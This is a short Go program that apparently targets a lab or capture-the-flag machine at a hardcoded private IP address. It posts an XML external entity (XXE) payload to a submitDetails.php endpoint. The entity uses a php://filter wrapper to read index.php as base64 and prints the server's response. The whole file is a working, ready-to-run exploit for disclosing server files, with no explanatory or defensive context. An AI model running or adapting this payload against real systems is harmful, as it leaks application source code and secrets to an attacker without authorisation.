package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func sendingInjection(url string) {

	payload := `<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [
	  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
	]>
	<root>
	<name>arturo</name>
	<tel>5656</tel>
	<email>&company;</email>
	<message>test</message>
	</root>`
	resp, err := http.Post(url+"submitDetails.php", "text/xml", strings.NewReader(payload))
	if err != nil {
		log.Fatal("something went wrong!!!")
	}

	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))
}

func main() {
	fmt.Println("initializing xxe injection...")
	sendingInjection("http://10.129.144.220/")
}
